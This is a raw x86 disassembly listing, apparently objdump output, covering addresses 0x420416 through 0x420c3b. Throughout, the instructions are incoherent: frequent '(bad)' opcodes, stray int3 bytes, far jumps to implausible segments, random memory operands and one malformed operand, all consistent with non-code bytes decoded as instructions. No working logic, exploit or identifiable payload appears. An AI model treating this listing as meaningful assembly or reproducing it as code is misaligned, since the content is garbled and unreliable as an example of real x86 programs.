  420416:	dec    esp
  420418:	loop   0x420431
  42041a:	mov    DWORD PTR [eax],eax
  42041c:	xor    al,0xb2
  42041e:	inc    DWORD PTR [ebx-0x33ff5a77]
  420424:	inc    ecx
  420425:	jbe    0x420427
  420427:	jmp    FWORD PTR [edx-0x54ff007e]
  42042d:	fiadd  WORD PTR [ebx+0x4eb883]
  420433:	dec    ebx
  420435:	mov    esp,0x34d18383
  42043a:	mov    DWORD PTR [ebx+0x6395],eax
  420440:	mov    ?,WORD PTR [ebp-0x1]
  420443:	cmp    DWORD PTR [esi-0x5007c1b],0x3
  42044a:	inc    DWORD PTR [eax]
  42044c:	sbb    al,0x82
  42044e:	mov    DWORD PTR [ebx-0x3300d550],eax
  420454:	stc    
  420455:	in     eax,dx
  420456:	inc    DWORD PTR [ebx+0x89b30a]
  42045c:	xchg   edi,eax
  42045d:	xchg   edx,eax
  42045e:	add    bh,bh
  420460:	adc    al,0xfc
  420462:	int3   
  420463:	xor    DWORD PTR [ecx*2-0x75c80001],0x0
  42046b:	add    ah,al
  42046d:	xor    eax,0xfe34cc83
  420472:	inc    DWORD PTR [eax]
  420474:	adc    al,0x86
  420476:	int3   
  420477:	call   FWORD PTR [edi]
  420479:	or     al,0xff
  42047b:	(bad)  
  42047c:	jmp    0x4204c0
  42047e:	add    BYTE PTR [eax],al
  420480:	jge    0x4204d1
  420482:	dec    DWORD PTR [ecx-0xff89a3]
  420488:	jmp    0xff87:0x54ff8359
  42048f:	add    BYTE PTR [ebx+0x78],bl
  420492:	add    ah,cl
  420494:	xlat   BYTE PTR ds:[ebx]
  420495:	dec    ebp
  420496:	add    BYTE PTR [ebx-0x3300efb7],al
  42049c:	adc    BYTE PTR [ecx-0x34],al
  42049f:	jmp    DWORD PTR [ebx-0x6d]
  4204a2:	mov    DWORD PTR [eax],eax
  4204a4:	pop    ebx
  4204a5:	(bad)  
  4204a6:	int3   
  4204a7:	add    BYTE PTR [edi],ah
  4204a9:	mov    ebx,0x26a8ffcc
  4204ae:	inc    DWORD PTR [eax]
  4204b0:	cmovo  eax,DWORD PTR [ebx-0xbb5c01]
  4204b7:	sub    DWORD PTR [ebx],0xffffffaf
  4204ba:	add    BYTE PTR [ebx-0x7c003c16],al
  4204c0:	dec    ecx
  4204c1:	pop    esp
  4204c2:	or     esp,0xffffffff
  4204c5:	or     ecx,DWORD PTR [ecx-0x7cf5c601]
  4204cb:	sub    DWORD PTR ds:0xd1cc8361,0x5f
  4204d2:	add    bh,bh
  4204d4:	dec    ebx
  4204d5:	gs int3 
  4204d7:	add    BYTE PTR [edi-0x48ff7612],al
  4204dd:	pushf  
  4204de:	add    bh,bh
  4204e0:	int    0x88
  4204e2:	add    bh,bh
  4204e4:	stos   BYTE PTR es:[edi],al
  4204e5:	or     bh,bh
  4204e7:	cmp    DWORD PTR [ecx+0x35],0x0
  4204eb:	jmp    FWORD PTR [ebp-0x16]
  4204ee:	dec    esp
  4204f0:	in     al,0x52
  4204f2:	inc    DWORD PTR [eax]
  4204f4:	inc    edx
  4204f5:	jge    0x42047a
  4204f7:	add    BYTE PTR [ecx],ah
  4204f9:	push   eax
  4204fa:	inc    DWORD PTR [ebx-0x7c003986]
  420500:	and    BYTE PTR [ebp-0x338d0100],bh
  420506:	inc    DWORD PTR [eax]
  420508:	das    
  420509:	rol    DWORD PTR [ebx-0xdba07d],0xcc
  420510:	inc    edi
  420511:	scas   eax,DWORD PTR es:[edi]
  420512:	dec    esp
  420514:	mov    al,ds:0xbdffffe8
  420519:	inc    esi
  42051a:	cmp    edi,0xc
  42051d:	adc    edi,edi
  42051f:	inc    ecx
  420521:	mov    ah,0x0
  420523:	push   DWORD PTR [esi+0x78ff00a8]
  420529:	scas   al,BYTE PTR es:[edi]
  42052a:	inc    DWORD PTR [eax]
  42052c:	cmp    eax,0x21890056
  420531:	mov    edx,0xf01eff00
  420536:	add    bh,bh
  420538:	fcmovu st,st(6)
  42053a:	mov    edi,edi
  42053c:	push   ebp
  42053e:	(bad)  
  42053f:	jmp    FWORD PTR [esp+edi*1-0x1]
  420543:	cmp    ecx,0x7
  420546:	inc    DWORD PTR [eax]
  420548:	call   0xff03:0x10ff00c4
  42054f:	mov    DWORD PTR [edi],edi
  420551:	xchg   ebx,eax
  420552:	cmp    edi,0xffffff8a
  420555:	je     0x420556
  420557:	inc    edx
  420559:	sbb    al,0x0
  42055b:	adc    ebp,0xffffffca
  42055e:	add    BYTE PTR [ecx-0xffd9eb],cl
  420564:	fsub   QWORD PTR [esi+0x0]
  420567:	mov    DWORD PTR [edx-0x10],ebx
  42056a:	add    BYTE PTR [eax],al
  42056c:	shl    esi,1
  42056e:	add    bh,bh
  420570:	and    dh,BYTE PTR [edx+0x0]
  420573:	inc    DWORD PTR [eax+0x3083ff40]
  420579:	pop    eax
  42057a:	add    BYTE PTR [eax],al
  42057c:	mov    esi,0x3cffffb4
  420581:	test   eax,0x6f7e0000
  420586:	add    BYTE PTR [eax],al
  420588:	fs dec edi
  42058a:	(bad)  
  42058b:	inc    ebp
  42058d:	pop    ss
  42058e:	add    bh,bh
  420590:	xchg   ebp,eax
  420591:	arpl   WORD PTR [ebx-0xd06900],ax
  420597:	int3   
  420598:	mov    ch,0x84
  42059a:	int3   
  42059b:	cmp    ebp,0x25
  42059e:	add    bh,bh
  4205a0:	inc    edx
  4205a1:	jg     0x4205a2
  4205a3:	mov    DWORD PTR [ebx],ecx
  4205a5:	and    BYTE PTR [eax],al
  4205a7:	jmp    FWORD PTR [edx]
  4205a9:	inc    DWORD PTR es:[eax]
  4205ac:	pop    eax
  4205ad:	imul   ecx,DWORD PTR [ecx+0xf92d83],0xff7361ff
  4205b7:	(bad)  
  4205b8:	out    dx,al
  4205b9:	inc    ebx
  4205ba:	(bad)  
  4205bb:	dec    esp
  4205bd:	daa    
  4205be:	cmp    edi,0xffffffc5
  4205c1:	xchg   ebp,eax
  4205c2:	(bad)  
  4205c3:	call   DWORD PTR [ecx-0x56]
  4205c6:	add    DWORD PTR [ebx-0x7c361d],0x2b
  4205cd:	pop    ds
  4205ce:	inc    DWORD PTR [eax]
  4205d0:	or     DWORD PTR [ecx+0x5f74ff00],0x3a7fff83
  4205da:	cmp    edi,0xffffffed
  4205dd:	xchg   edi,edi
  4205df:	push   ebx
  4205e1:	jmp    0xcc:0xeebdffff
  4205e8:	xchg   ecx,eax
  4205e9:	ret    
  4205ea:	add    BYTE PTR [eax],al
  4205ec:	cli    
  4205ed:	idiv   bh
  4205ef:	add    ah,al
  4205f1:	fld    QWORD PTR [eax]
  4205f3:	mov    edi,ecx
  4205f5:	(bad)  
  4205f6:	inc    DWORD PTR [eax]
  4205f8:	aaa    
  4205f9:	jne    0x4205fa
  4205fb:	inc    DWORD PTR [eax]
  4205fd:	rol    DWORD PTR [ebx-0xa4a477],cl
  420603:	add    bl,bh
  420605:	mov    eax,0xb1a5ffff
  42060a:	(bad)  
  42060b:	(bad)  
  42060c:	mov    edi,0xbbccffc5
  420611:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420612:	(bad)  
  420613:	inc    esp
  420615:	mov    ebp,0xe1b0000
  42061a:	add    bh,bh
  42061c:	adc    dh,BYTE PTR [ebx-0x1]
  42061f:	add    BYTE PTR [edx-0x5a],ah
  420622:	add    bh,bh
  420624:	mov    esp,0x56ff0058
  420629:	pop    esi
  42062a:	inc    DWORD PTR [eax]
  42062c:	test   BYTE PTR [ecx+0x6980ffff],ah
  420632:	add    bh,bh
  420634:	cwde   
  420635:	or     DWORD PTR es:[ecx-0xff90d8],0x72
  42063d:	add    BYTE PTR [eax],0xff
  420640:	les    esi,FWORD PTR [edi+edi*8-0x77]
  420644:	aaa    
  420645:	test   DWORD PTR [eax],0xff46b100
  42064b:	int3   
  42064c:	fldcw  WORD PTR [ebx]
  42064e:	(bad)  
  42064f:	jmp    esi
  420651:	imul   eax,DWORD PTR [eax],0xffffffff
  420654:	push   ds
  420655:	and    bh,bh
  420657:	add    BYTE PTR [edi],dh
  420659:	add    BYTE PTR [eax],0xcc
  42065c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42065d:	ss add bh,bh
  420660:	ins    DWORD PTR es:[edi],dx
  420661:	dec    esi
  420662:	add    DWORD PTR [ebx-0x763323ff],0x29
  420669:	lods   al,BYTE PTR ds:[esi]
  42066a:	(bad)  
  42066b:	jmp    FWORD PTR [esi-0x4f00339b]
  420671:	ss int3 
  420673:	jmp    DWORD PTR ds:0x34000080
  420679:	xchg   edi,eax
  42067a:	add    bh,bh
  42067c:	arpl   cx,bx
  42067e:	inc    DWORD PTR [eax]
  420680:	push   0xffffffc7
  420682:	inc    DWORD PTR [ebx-0x7633a7ef]
  420688:	xlat   BYTE PTR ds:[ebx]
  420689:	aaa    
  42068a:	inc    DWORD PTR [eax]
  42068c:	outs   dx,BYTE PTR ds:[esi]
  42068d:	bound  eax,QWORD PTR [eax]
  42068f:	or     DWORD PTR [ebx+0x7a],0xffffffcc
  420693:	adc    DWORD PTR [ecx],0x2c
  420696:	inc    DWORD PTR [eax]
  420698:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420699:	pop    ebx
  42069a:	int3   
  42069b:	(bad)  
  42069c:	call   0x22430656
  4206a1:	outs   dx,DWORD PTR ds:[esi]
  4206a2:	inc    DWORD PTR [ebx-0xffb044]
  4206a8:	xchg   ecx,eax
  4206a9:	push   ebx
  4206aa:	dec    DWORD PTR [ecx+0x83cbdd]
  4206b0:	icebp  
  4206b1:	inc    ebp
  4206b2:	add    bh,bh
  4206b4:	jae    0x420710
  4206b6:	(bad)  
  4206b7:	push   DWORD PTR [ebp+0x53]
  4206ba:	or     esp,0xffffffaf
  4206bd:	add    BYTE PTR [eax],0x0
  4206c0:	scas   eax,DWORD PTR es:[edi]
  4206c1:	aas    
  4206c2:	(bad)  
  4206c3:	inc    ebp
  4206c5:	sar    bh,0xcc
  4206c8:	call   0xff0c:0xa20000b6
  4206cf:	add    BYTE PTR [ecx],ah
  4206d1:	jp     0x4206d2
  4206d3:	dec    DWORD PTR [eax-0x2bff7cdf]
  4206d9:	call   0x713f8aaa
  4206de:	inc    DWORD PTR [eax]
  4206e0:	shl    BYTE PTR [ebx-0x2ee50100],1
  4206e6:	inc    DWORD PTR [eax]
  4206e8:	cs push 0x8ad700ff
  4206ee:	add    bh,bh
  4206f0:	stos   DWORD PTR es:[edi],eax
  4206f1:	sar    bh,0x0
  4206f4:	push   ecx
  4206f5:	ret    
  4206f6:	cmp    edi,0xa
  4206f9:	mov    bl,0xff
  4206fb:	inc    DWORD PTR [ebx-0x6a00ff44]
  420701:	jb     0x420702
  420703:	(bad)  
  420704:	jg     0x4206f1
  420706:	(bad)  
  420707:	call   FWORD PTR [edx-0x32]
  42070a:	dec    esp
  42070c:	out    0xf9,eax
  42070e:	add    BYTE PTR [eax],al
  420710:	call   0xe420647
  420715:	adc    al,0xff
  420717:	add    ah,cl
  420719:	mov    esp,0x3b13ff00
  42071e:	dec    esp
  420720:	sbb    BYTE PTR [ebp+0x525dcc00],0xcc
  420727:	jmp    DWORD PTR [ebx]
  420729:	jbe    0x4206f7
  42072b:	add    ch,dh
  42072d:	ror    DWORD PTR [ecx+0x588cc],cl
  420733:	add    BYTE PTR [edi-0x247c0038],al
  420739:	lahf   
  42073a:	inc    DWORD PTR [eax]
  42073c:	out    0xd7,eax
  42073e:	add    bh,bh
  420740:	mov    DWORD PTR [edx-0x1],ecx
  420743:	push   DWORD PTR [ebp+0xc]
  420746:	dec    DWORD PTR [ecx-0x7ca81e]
  42074c:	call   0x184107b8
  420751:	js     0x420753
  420753:	add    BYTE PTR [ebp+ecx*8-0x65a5ff01],cl
  42075a:	dec    esp
  42075c:	arpl   WORD PTR [edi+edi*8-0x1],cx
  420760:	ds cli 
  420762:	inc    DWORD PTR [ebx-0x33ff8135]
  420768:	pop    esp
  420769:	add    eax,DWORD PTR [ebx+0x22f989]
  42076f:	jmp    DWORD PTR [eax]
  420771:	xchg   ebx,eax
  420772:	add    BYTE PTR [eax],al
  420774:	mov    ch,0x67
  420776:	cmp    edi,0xffffff8b
  420779:	outs   dx,DWORD PTR ds:[esi]
  42077a:	dec    DWORD PTR [ecx-0x76bc44]
  420780:	sti    
  420781:	lock add BYTE PTR [ebx-0x33ffd982],al
  420788:	push   ecx
  420789:	loopne 0x42078b
  42078b:	int3   
  42078c:	stc    
  42078d:	mov    edi,0x965cffff
  420792:	(bad)  
  420793:	push   DWORD PTR [ebx-0x7a]
  420796:	dec    DWORD PTR [ecx-0x76cb43]
  42079c:	repnz fs (bad) 
  42079f:	inc    DWORD PTR [ecx]
  4207a1:	xor    eax,0x60a283cc
  4207a6:	cmp    edi,0x66
  4207a9:	inc    edi
  4207aa:	(bad)  
  4207ab:	(bad)  
  4207ac:	cmp    ch,dh
  4207ae:	add    bh,bh
  4207b0:	adc    DWORD PTR [esi],edi
  4207b2:	inc    DWORD PTR [eax]
  4207b4:	cmc    
  4207b5:	ins    BYTE PTR es:[edi],dx
  4207b6:	inc    DWORD PTR [eax]
  4207b8:	fdivr  DWORD PTR [edx]
  4207ba:	add    bh,bh
  4207bc:	mov    cl,0x7c
  4207be:	(bad)  
  4207bf:	dec    edx
  4207c1:	dec    esp
  4207c2:	dec    DWORD PTR [ecx+0x83ac7c]
  4207c8:	les    edx,FWORD PTR ds:0x7cc3ffff
  4207ce:	cmp    edi,0x21
  4207d1:	out    dx,al
  4207d2:	add    DWORD PTR [ebx-0x33006d09],0x22
  4207d9:	nop
  4207da:	inc    DWORD PTR [eax]
  4207dc:	mov    eax,ds:0xf700ffdf
  4207e1:	js     0x4207af
  4207e3:	call   DWORD PTR [edx]
  4207e5:	xchg   DWORD PTR [ebx+0xf217ff],eax
  4207eb:	jmp    FWORD PTR [edi-0xa0000df]
  4207f1:	cmp    bh,0x0
  4207f4:	or     DWORD PTR [ebp+0x491accff],esp
  4207fa:	(bad)  
  4207fb:	dec    DWORD PTR [ecx-0x20]
  4207fe:	inc    DWORD PTR [ebx-0xff3a4f]
  420804:	adc    BYTE PTR [edx+0x6324ffff],0x89
  42080b:	add    BYTE PTR [edi],ah
  42080d:	pushf  
  42080e:	inc    DWORD PTR [eax]
  420810:	mov    ds:0xbaffff33,eax
  420815:	pop    eax
  420816:	inc    DWORD PTR [eax]
  420818:	cmp    dl,BYTE PTR [eax]
  42081a:	inc    DWORD PTR [eax]
  42081c:	mov    cl,0xe0
  42081e:	(bad)  
  42081f:	dec    DWORD PTR [eax-0x7c00b8]
  420825:	stos   BYTE PTR es:[edi],al
  420826:	(bad)  
  420827:	dec    DWORD PTR [esi+ebx*4+0x0]
  42082b:	add    cl,dl
  42082d:	int    0xff
  42082f:	call   DWORD PTR [ecx-0x8]
  420832:	add    BYTE PTR [eax],al
  420834:	arpl   WORD PTR [ebp-0x450f0000],dx
  42083a:	(bad)  
  42083b:	push   DWORD PTR [esi-0x28]
  42083e:	add    BYTE PTR [ebx-0x76a941],al
  420844:	mov    ds,WORD PTR [edi+edi*8]
  420847:	dec    DWORD PTR [edx-0x1c33ff60]
  42084d:	pop    ds
  42084e:	(bad)  
  42084f:	push   edi
  420851:	int    0xff
  420853:	add    BYTE PTR [ebx],bl
  420855:	xor    edi,edi
  420857:	add    BYTE PTR [ebx+edi*8-0x1],dl
  42085b:	int3   
  42085c:	ret    0x7b
  42085f:	xor    DWORD PTR ds:0x6bffff34,0xffffffc1
  420866:	add    bh,bh
  420868:	shl    bh,cl
  42086a:	dec    esp
  42086c:	or     DWORD PTR [edx],ebx
  42086e:	(bad)  
  42086f:	jmp    DWORD PTR [eax+edi*2-0x1]
  420873:	jmp    FWORD PTR [ebp+0x3f00ffc4]
  420879:	mov    edi,edi
  42087b:	dec    DWORD PTR [eax-0x25]
  42087e:	cmp    edi,0x33
  420881:	ror    BYTE PTR [ecx-0x7ca59b01],cl
  420887:	add    DWORD PTR [edi-0x44],0xffffffff
  42088b:	add    ch,dh
  42088d:	xchg   ebp,eax
  42088e:	add    BYTE PTR [eax],al
  420890:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420891:	xlat   BYTE PTR ds:[ebx]
  420892:	(bad)  
  420893:	push   DWORD PTR [edi+0x37]
  420896:	mov    esp,ecx
  420898:	sub    eax,0x60ffffdc
  42089d:	icebp  
  42089e:	(bad)  
  42089f:	dec    DWORD PTR [eax+0x6d]
  4208a2:	add    ah,cl
  4208a4:	adc    ebx,ebx
  4208a6:	(bad)  
  4208a7:	push   DWORD PTR [ebp+edx*2-0x28a90100]
  4208ae:	mov    edi,edi
  4208b0:	out    0x12,eax
  4208b2:	(bad)  
  4208b3:	jmp    DWORD PTR [ebx+0x6e]
  4208b6:	cmp    edi,0x23
  4208b9:	mov    bh,0x89
  4208bb:	add    BYTE PTR [esi+0x408383f7],bl
  4208c1:	and    edi,edi
  4208c3:	call   FWORD PTR [esi]
  4208c5:	dec    edi
  4208c6:	mov    edi,edi
  4208c8:	dec    eax
  4208c9:	sbb    BYTE PTR [eax],al
  4208cb:	add    BYTE PTR [ecx+0x2a],bl
  4208ce:	inc    DWORD PTR [eax]
  4208d0:	mov    ch,0x7e
  4208d2:	cmp    edi,0x45
  4208d5:	cmc    
  4208d6:	inc    DWORD PTR [eax]
  4208d8:	(bad)  
  4208d9:	das    
  4208da:	add    bh,bh
  4208dc:	xor    eax,0x4500ffec
  4208e1:	xor    eax,DWORD PTR [ebx+0xa6ce89]
  4208e7:	add    BYTE PTR [eax+0x37ffcc4f],dh
  4208ed:	push   0x652b00ff
  4208f2:	add    BYTE PTR [ebx-0x7cfbb5],al
  4208f8:	repz push edi
  4208fa:	(bad)  
  4208fb:	(bad)  
  4208fc:	fistp  WORD PTR [ebp-0x6fff7c01]
  420902:	(bad)  
  420903:	jmp    FWORD PTR [ecx]
  420905:	rol    DWORD PTR [eax],1
  420907:	int3   
  420908:	cld    
  420909:	mov    cl,0xff
  42090b:	add    BYTE PTR [ecx+0x4affffb6],cl
  420911:	jge    0x420912
  420913:	add    BYTE PTR [edx],dh
  420915:	fiadd  DWORD PTR [eax]
  420917:	add    dl,bl
  420919:	or     eax,0x5a0eff00
  42091e:	add    bh,bh
  420920:	les    esi,FWORD PTR [ecx+ecx*4-0x1]
  420924:	mov    ebx,0xe600ff1c
  420929:	in     al,0xff
  42092b:	add    BYTE PTR [eax-0x33],al
  42092e:	or     esp,0x4d
  420931:	daa    
  420932:	(bad)  
  420933:	push   eax
  420935:	xchg   edi,eax
  420936:	(bad)  
  420937:	jmp    FWORD PTR [ebx+ebp*4-0x1]
  42093b:	dec    DWORD PTR [ebp+0x9]
  42093e:	inc    DWORD PTR [eax]
  420940:	loopne 0x4208e2
  420942:	(bad)  
  420943:	call   FWORD PTR [edi]
  420945:	push   es
  420946:	mov    edi,edi
  420948:	into   
  420949:	dec    ecx
  42094a:	or     esp,0xfffffff2
  42094d:	mov    bh,bh
  42094f:	mov    DWORD PTR [edx],eax
  420951:	jae    0x4208d6
  420953:	add    BYTE PTR [ecx+edx*2-0x34],bh
  420957:	sbb    eax,0x34
  42095a:	inc    DWORD PTR [ebx+0xff45c1]
  420960:	(bad)  
  420961:	hlt    
  420962:	inc    DWORD PTR [ebx-0x3300dee0]
  420968:	(bad)  
  420969:	mov    BYTE PTR [eax],al
  42096b:	jmp    FWORD PTR [eax-0x75]
  42096e:	int3   
  42096f:	call   DWORD PTR [eax+edi*4-0x60e3ff01]
  420976:	(bad)  
  420977:	jmp    esi
  420979:	mov    edx,0x4f09ccff
  42097e:	int3   
  42097f:	jmp    DWORD PTR [edi]
  420981:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420982:	int3   
  420983:	jmp    DWORD PTR [eax]
  420985:	adc    eax,0x82d4ff83
  42098a:	add    BYTE PTR [ecx+0xff7e89],cl
  420990:	jno    0x4209a2
  420992:	(bad)  
  420993:	push   DWORD PTR [esi]
  420995:	adc    edi,edi
  420997:	add    BYTE PTR [edi+0x5800ff64],dl
  42099d:	fadd   QWORD PTR [ebx-0x76a5b000]
  4209a3:	(bad)  
  4209a4:	fsubp  st(1),st
  4209a6:	cmp    edi,0xffffffbc
  4209a9:	xchg   BYTE PTR [ecx-0x659f01],cl
  4209af:	(bad)  
  4209b0:	mov    ebx,0x2900ffa1
  4209b5:	mov    al,0x89
  4209b7:	int3   
  4209b8:	sahf   
  4209b9:	or     eax,0x3f440000
  4209be:	inc    DWORD PTR [ebx-0xff7ea6]
  4209c4:	retf   0xcca9
  4209c7:	add    cl,cl
  4209c9:	fild   WORD PTR [ebx-0x21c27d]
  4209cf:	dec    DWORD PTR [edi]
  4209d1:	inc    ebx
  4209d2:	inc    DWORD PTR [eax]
  4209d4:	fbstp  TBYTE PTR [eax-0x439ff01]
  4209da:	add    BYTE PTR [ebx+0x24e2],al
  4209e0:	push   ds
  4209e1:	cwde   
  4209e2:	inc    DWORD PTR [ebx-0xff2800]
  4209e8:	or     ebp,DWORD PTR [ebx-0xfee0000]
  4209ee:	inc    DWORD PTR [ebx-0x33ff18e7]
  4209f4:	jmp    0xd64209ca
  4209f9:	inc    edx
  4209fa:	mov    edi,edi
  4209fc:	cmc    
  4209fd:	cmp    bh,0xff
  420a00:	dec    edx
  420a01:	pushf  
  420a02:	add    DWORD PTR [eax],0xf
  420a05:	pop    ds
  420a06:	int3   
  420a07:	call   FWORD PTR [ebx+0x1ff8398]
  420a0d:	aas    
  420a0e:	(bad)  
  420a0f:	jmp    FWORD PTR [eax+esi*8-0x34]
  420a13:	add    al,dh
  420a15:	add    DWORD PTR [eax],0xffffffff
  420a18:	push   0x1383ffeb
  420a1d:	mov    bl,0xff
  420a1f:	sub    ebp,0xffffffef
  420a22:	inc    DWORD PTR [ebx-0x9eac]
  420a28:	in     eax,dx
  420a29:	push   eax
  420a2a:	inc    DWORD PTR [eax]
  420a2c:	cld    
  420a2d:	sub    eax,0xc6f689ff
  420a32:	dec    DWORD PTR [ecx-0x7cffd7bd]
  420a38:	mov    al,ds:0x63ffff1f
  420a3d:	inc    eax
  420a3e:	add    bh,bh
  420a40:	inc    edi
  420a41:	push   edx
  420a42:	inc    DWORD PTR [ebx-0xff8b5f]
  420a48:	dec    ecx
  420a49:	sub    al,0xcc
  420a4b:	int3   
  420a4c:	imul   esi,ecx,0xffffffff
  420a4f:	dec    esp
  420a51:	and    edi,edi
  420a53:	add    BYTE PTR [edx-0x55],bh
  420a56:	inc    DWORD PTR [eax]
  420a58:	sbb    BYTE PTR [ebp-0x1],dh
  420a5b:	call   DWORD PTR [edx]
  420a5d:	(bad)  
  420a5e:	dec    esp
  420a60:	jle    0x420a4c
  420a62:	(bad)  
  420a63:	dec    DWORD PTR [edx+0x41ffffb6]
  420a69:	inc    ebp
  420a6a:	(bad)  
  420a6b:	dec    DWORD PTR [esi+0x10]
  420a6e:	add    bh,bh
  420a70:	mov    eax,ds:0x658383a6
  420a75:	(bad)  
  420a76:	(bad)  
  420a77:	jmp    FWORD PTR [ecx-0x3d0000f1]
  420a7d:	pop    ds
  420a7e:	inc    DWORD PTR [eax]
  420a80:	or     BYTE PTR [ebx-0x1],bl
  420a83:	add    BYTE PTR [esi],ch
  420a85:	dec    ebx
  420a86:	(bad)  
  420a87:	push   DWORD PTR ds:0xcc8983b2
  420a8d:	sar    edi,0x0
  420a90:	pop    edi
  420a91:	inc    DWORD PTR cs:[eax]
  420a94:	fwait
  420a95:	jns    0x420a97
  420a97:	add    BYTE PTR [ebp+0x2],dh
  420a9a:	inc    DWORD PTR [eax]
  420a9c:	add    DWORD PTR [ebx],0xf47aff00
  420aa2:	add    BYTE PTR [ebx-0xcd6a],al
  420aa8:	shl    BYTE PTR [esi-0x29790077],cl
  420aae:	inc    DWORD PTR [eax]
  420ab0:	out    0x98,eax
  420ab2:	(bad)  
  420ab3:	(bad)  
  420ab4:	cmp    bh,BYTE PTR [eax+0x0]
  420ab7:	int3   
  420ab8:	mov    ah,0xaa
  420aba:	int3   
  420abb:	mov    DWORD PTR [esi-0x7dff009b],esi
  420ac1:	xor    al,BYTE PTR [eax]
  420ac3:	add    BYTE PTR [edx+0x5283ffc7],dl
  420ac9:	and    ecx,DWORD PTR [ecx-0xe8f801]
  420acf:	add    BYTE PTR [eax+0x53830086],ch
  420ad5:	mov    es,WORD PTR [ebx-0x46ff00]
  420adb:	sub    DWORD PTR [ebx-0x6d],0xffffffff
  420adf:	add    BYTE PTR [edi-0x52],ah
  420ae2:	add    bh,bh
  420ae4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420ae5:	pop    DWORD PTR [eax]
  420ae7:	push   DWORD PTR [ecx-0x26]
  420aea:	(bad)  
  420aeb:	call   DWORD PTR [esi-0x33760055]
  420af1:	mov    ecx,0x2cdfffff
  420af6:	add    bh,bh
  420af8:	popf   
  420af9:	dec    esi
  420afa:	or     esp,0x57
  420afd:	(bad)  
  420afe:	(bad)  
  420aff:	call   edi
  420b01:	xchg   ebx,eax
  420b02:	(bad)  
  420b03:	call   FWORD PTR [ebx-0x4d]
  420b06:	inc    DWORD PTR [eax]
  420b08:	pushf  
  420b09:	cwde   
  420b0a:	add    BYTE PTR [eax],al
  420b0c:	mov    ds:0xc0000da,eax
  420b11:	loope  0x420b12
  420b13:	add    BYTE PTR [edi+edi*1],dh
  420b16:	add    bh,bh
  420b18:	inc    edi
  420b1a:	(bad)  
  420b1b:	push   ebx
  420b1d:	inc    ecx
  420b1e:	add    ah,cl
  420b20:	adc    BYTE PTR [ecx+0x8aeff00],ch
  420b26:	add    BYTE PTR [ebx-0x7c001c9d],al
  420b2c:	push   ebx
  420b2d:	(bad)  
  420b2f:	dec    DWORD PTR [esi+0x6a]
  420b32:	(bad)  
  420b33:	jmp    FWORD PTR [ebp-0x3b]
  420b36:	add    bh,bh
  420b38:	jne    0x420ba3
  420b3a:	(bad)  
  420b3b:	inc    ebp
  420b3d:	inc    ebp
  420b3e:	int3   
  420b3f:	(bad)  
  420b40:	cmp    dl,BYTE PTR [ebx]
  420b42:	(bad)  
  420b43:	jmp    edi
  420b45:	jle    0x420b47
  420b47:	dec    DWORD PTR [ebp+0x74ffcc35]
  420b4d:	int    0xff
  420b4f:	inc    DWORD PTR [eax+eax*1]
  420b52:	add    bh,bh
  420b54:	mov    ebx,0x9effff5e
  420b59:	ins    BYTE PTR es:[edi],dx
  420b5a:	(bad)  
  420b5b:	(bad)  
  420b5c:	jmp    0xcc40:0xf9ff00c7
  420b63:	dec    ecx
  420b65:	popa   
  420b66:	add    bh,bh
  420b68:	popf   
  420b69:	and    DWORD PTR [eax],eax
  420b6b:	add    BYTE PTR [ebp+edx*1-0x7d],cl
  420b6f:	add    BYTE PTR [esi],ah
  420b71:	push   ebx
  420b72:	(bad)  
  420b73:	call   FWORD PTR [edx-0x6cffff9a]
  420b79:	mov    ebx,0x7ce10083
  420b7e:	add    bh,bh
  420b80:	sub    al,0xb
  420b82:	inc    DWORD PTR [eax]
  420b84:	jb     0x420b39
  420b86:	or     DWORD PTR [ecx-0x78cb],0x1e
  420b8d:	adc    DWORD PTR [eax],eax
  420b8f:	add    BYTE PTR [ebx-0x72],cl
  420b92:	int3   
  420b93:	mov    esi,esp
  420b95:	pop    es
  420b96:	(bad)  
  420b97:	call   DWORD PTR [ebx-0xff33e3]
  420b9d:	fdiv   st(7),st
  420b9f:	call   DWORD PTR [edi]
  420ba1:	push   ecx
  420ba2:	add    bh,bh
  420ba4:	dec    ebp
  420ba5:	jbe    0x420ba6
  420ba7:	jmp    DWORD PTR [ecx-0x4a003385]
  420bad:	adc    bh,bh
  420baf:	push   esp
  420bb1:	and    eax,DWORD PTR [eax]
  420bb3:	cmp    edi,0x9
  420bb6:	add    BYTE PTR [eax],al
  420bb8:	inc    ecx
  420bb9:	xchg   ebp,eax
  420bba:	inc    DWORD PTR [ebx+0x839f3a]
  420bc0:	mov    al,0x77
  420bc2:	cmp    edi,0xffffffab
  420bc5:	fwait
  420bc6:	add    ah,cl
  420bc8:	xor    esp,DWORD PTR [ecx-0x557fff01]
  420bce:	add    bh,bh
  420bd0:	jmp    0xb5428fb6
  420bd5:	imul   edi,edi,0xcc471a83
  420bdb:	jmp    DWORD PTR [edx+0x5f]
  420bde:	(bad)  
  420bdf:	dec    DWORD PTR [ebx+eiz*4+0x0]
  420be3:	and    DWORD PTR [ebx+edi*1],0xffffff83
  420be7:	xor    DWORD PTR [ebx+ecx*1],0xffffffcc
  420beb:	add    BYTE PTR [edx-0xe],ch
  420bee:	add    BYTE PTR [eax],al
  420bf0:	ds jae 0x420bf3
  420bf3:	dec    DWORD PTR [eax-0x7c00005b]
  420bf9:	sbb    al,0x83
  420bfb:	add    dl,al
  420bfd:	ins    BYTE PTR es:[edi],dx
  420bfe:	dec    DWORD PTR [ecx-0xff810e]
  420c04:	(bad)  
  420c05:	lock add BYTE PTR [eax],al
  420c08:	sub    DWORD PTR [edx+0x0],esi
  420c0b:	jmp    DWORD PTR [edx-0x1]
  420c0e:	add    bh,bh
  420c10:	xor    eax,0x9affff34
  420c15:	inc    DWORD PTR [bp+di-0x332]
  420c1a:	(bad)  
  420c1b:	(bad)  
  420c1c:	cld    
  420c1d:	pusha  
  420c1e:	inc    DWORD PTR [eax]
  420c20:	ins    DWORD PTR es:[edi],dx
  420c21:	cs (bad) 
  420c23:	push   DWORD PTR [edx+0x6b8900f8]
  420c29:	pop    esp
  420c2a:	add    DWORD PTR [ebx+0xff4e48],0xffffffa8
  420c31:	call   0x8983:0x1734ffff
  420c38:	scas   al,BYTE PTR es:[edi]
  420c39:	push   eax
  420c3a:	(bad)  
  420c3b:	jmp    DWORD PTR [edi-0x3e7c33e5]
